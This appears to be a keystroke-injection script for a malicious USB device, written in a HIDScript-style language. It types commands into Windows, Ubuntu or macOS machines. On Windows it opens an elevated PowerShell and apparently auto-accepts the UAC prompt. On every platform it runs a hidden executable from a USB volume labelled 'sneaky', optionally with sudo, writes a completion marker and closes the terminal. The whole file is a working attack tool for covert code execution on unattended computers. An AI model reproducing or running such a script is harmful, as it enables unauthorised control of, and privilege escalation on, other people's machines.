typingSpeed(10,0)

// will be changed via sed
var lang = 'de'
var os = 'Windows'
var cmdArgs = ''
var needRoot = 'false'

// set keyboard language
layout(lang)

// helpers
function runPowershell() {
    press("GUI r") // windows + r
    delay(500)
    type("powershell\n") // write powershell and press "enter"
    delay(1000)
}

function runPrivPowershell() {
    press("GUI r") // windows + r
    delay(500)
    type("powershell") // write powershell and press "enter"
  	press("CTRL SHIFT RETURN")
    delay(2000)
  	press("ALT J")
  	delay(3000)
}

function ubuntuTerminal() {
    press("GUI")
    // window effects delay
    // especially if running in VM
    delay(5000)
    type("ter\n")
    // use less delay later
  	delay(5000)
}

function macTerminal() {
  press("GUI SPACE")
  // window effects delay
  // especially if running in VM
  delay(5000)
  type("termi\n")
  // use less delay later
  delay(5000)
}

function winPayload() {
    // get drive name of mass storage, improved version: only the value!
    type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky' } | select -expand name\n")
  	// use double \ --> \\ (otherwise if gets escaped)
    type(".(Join-Path $usbPath 'win.exe') ")
  	type(cmdArgs)
    type(" ; if ($?) { [IO.File]::WriteAllLines((Join-Path $usbPath 'done.txt'), 'done') ; Write-VolumeCache $usbPath[0] ; exit}\n")
    press("ESC") // close uac prompt if a password is needed
}

function ubuntuPayload() {
    // path: /media/$(users)/sneaky
  
  	// old way with fat32 image --> required to copy the payload to /tmp because fat32 does not save unix permissions
    //type("cp /media/$(users)/sneaky/lin /tmp/ && chmod +x /tmp/lin && /tmp/lin ")
	  //type(cmdArgs)
  	//type(" && echo 'done' > /media/$(users)/sneaky/done.txt && exit\n")
  
  	// workaround for NTFS:
  	// force sync manually because the default ubuntu mount options seem to not sync the written file to the drive
  
  	// new way using ext4 image
  	if (needRoot === "true") {
      type("sudo /media/$(users)/sneaky/lin ")
    }
  	else {
      type("/media/$(users)/sneaky/lin ")
    }
  
  	type(cmdArgs)
  	// testing
  	//type(" && echo 'done' > /media/$(users)/sneaky/done.txt ")
  	type(" && echo 'done' > /media/$(users)/sneaky/done.txt && sync &\n")
    delay(500)
  	press("CTRL D")
}

function macPayload() {
  // TODO: check all language bruteforce
  // path: /Volumes/sneaky
  
  if (needRoot === "true") {
    type("sudo /Volumes/sneaky/mac ")
  }
  else {
    type("/Volumes/sneaky/mac ")
  }
  
  type(cmdArgs)
  
  if (lang === "de") {
    type(" && echo 'done' ° /Volumes/sneaky/done.txt && sync && pkill -a Terminal\n")
  } else if (lang === "us") {
    type(" && echo 'done' > /Volumes/sneaky/done.txt && sync && pkill -a Terminal\n")
  } else {
    // french
    type(" && echo 'done' ")
    
    // workaround to fix the broken french layout
  	// >
  	layout("us")
  	press("SHIFT Ü");
  	type("~");
    layout(lang)
    
    type(" /Volumes/sneaky/done.txt && sync && pkill =a Terminal\n")
  }
  
  delay(500)
  press("WIN Q") // close the terminal
}


if (os === "Windows") {
  if (needRoot === "true") {
    runPrivPowershell()
  }
  else {
    runPowershell()
  }
  winPayload()
}

else if (os === "Ubuntu") {
  ubuntuTerminal()
  ubuntuPayload()
}

else if (os === "Mac") {
  macTerminal()
  macPayload()
}
